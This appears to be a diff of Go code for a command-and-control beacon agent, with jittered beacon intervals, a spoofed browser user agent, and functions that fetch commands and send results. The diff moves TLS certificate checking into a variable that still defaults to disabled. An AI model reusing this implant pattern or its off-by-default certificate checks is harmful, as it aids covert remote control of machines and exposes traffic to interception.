@@ -50,6 +50,7 @@ var (
     beaconMin = 10
     beaconMax = 30
     userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+    tlsInsecureSkipVerify = true // set to false in prod if you want real cert check
 )
 
 
@@ -151,7 +152,7 @@ func fetchCommand(agentID string) (Command, error) {
 
 
     tr := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ⚠ For local testing only
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify}, // ⚠ For local testing only
     }
     client := &http.Client{
         Transport: tr,
@@ -205,7 +206,7 @@ func sendResult(result CommandResult) {
 
 
     tr := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify},
     }
     client := &http.Client{
         Transport: tr,
